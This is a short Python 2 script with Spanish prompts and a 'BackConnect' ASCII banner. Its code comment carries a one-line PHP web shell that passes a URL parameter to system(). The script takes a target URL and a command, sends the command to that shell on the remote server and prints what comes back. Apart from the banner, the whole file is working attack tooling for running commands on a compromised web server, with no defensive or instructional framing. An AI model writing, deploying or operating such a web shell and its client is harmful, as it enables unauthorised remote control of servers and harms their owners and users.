import requests

# Licencia GNU libre de modificaciones
# <?php system($_GET['1337']); ?>

print "\n________                    ___         ____                                            " 
print "`MMMMMMMb.                  `MM        6MMMMb/                                            " 
print " MM    `Mb                   MM       8P    YM                                       /    " 
print " MM     MM    ___     ____   MM   __ 6M      Y   _____  ___  __     ____     ____   /M    " 
print " MM    .M9  6MMMMb   6MMMMb. MM   d' MM         6MMMMMb `MM 6MMb   6MMMMb   6MMMMb./MMMMM " 
print " MMMMMMM(  8M'  `Mb 6M'   Mb MM  d'  MM        6M'   `Mb MMM9 `Mb 6M'  `Mb 6M'   Mb MM    " 
print " MM    `Mb     ,oMM MM    `' MM d'   MM        MM     MM MM'   MM MM    MM MM    `' MM    " 
print " MM     MM ,6MM9'MM MM       MMdM.   MM        MM     MM MM    MM MMMMMMMM MM       MM    " 
print " MM     MM MM'   MM MM       MMPYM.  YM      6 MM     MM MM    MM MM       MM       MM    " 
print " MM    .M9 MM.  ,MM YM.   d9 MM  YM.  8b    d9 YM.   ,M9 MM    MM YM    d9 YM.   d9 YM.  ," 
print "_MMMMMMM9' `YMMM9'Yb.YMMMM9 _MM_  YM._ YMMMM9   YMMMMM9 _MM_  _MM_ YMMMM9   YMMMM9   YMMM9"
print "----------------------------------- Licencia GNU -----------------------------------------"

web = raw_input("\nintroduce la url ~$ ")

comando = raw_input("introduce el Comando~$ ")

print "\n\n [ RESULTADO ] -----------------------------------\n\n"

url = requests.get(web + "/BackConect.php?1337=" + comando)

print url.text
